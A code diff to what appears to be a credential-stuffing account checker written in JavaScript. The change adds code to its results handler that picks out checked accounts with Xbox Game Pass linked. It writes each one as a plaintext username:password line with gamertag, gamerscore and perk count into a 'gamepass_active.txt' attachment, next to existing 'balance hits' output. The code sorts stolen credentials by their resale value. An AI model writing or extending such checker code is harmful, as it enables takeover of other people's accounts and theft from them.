@@ -1718,6 +1718,17 @@ async function handleBetaAio(respond, userId, accountsRaw, accountsFile, threads
         const lines = balanceHits.map(h => `${h.user}:${h.password} | Balance: $${h.payment.balance}`);
         files.push(textAttachment(lines, "balance_hits.txt"));
       }
+
+      const gpHits = hits.filter(h => h.bridge?.services?.GamePass?.linked);
+      if (gpHits.length) {
+        const lines = gpHits.map(h => {
+          const gp = h.bridge.services.GamePass;
+          const gt = h.bridge.services.Xbox?.gamertag || "N/A";
+          const gs = h.bridge.services.Xbox?.gamerscore || "0";
+          return `${h.user}:${h.password} | GT: ${gt} | GS: ${gs} | Perks: ${gp.offerCount}`;
+        });
+        files.push(textAttachment(lines, "gamepass_active.txt"));
+      }
     }
 
     // ZIP all files if more than 1
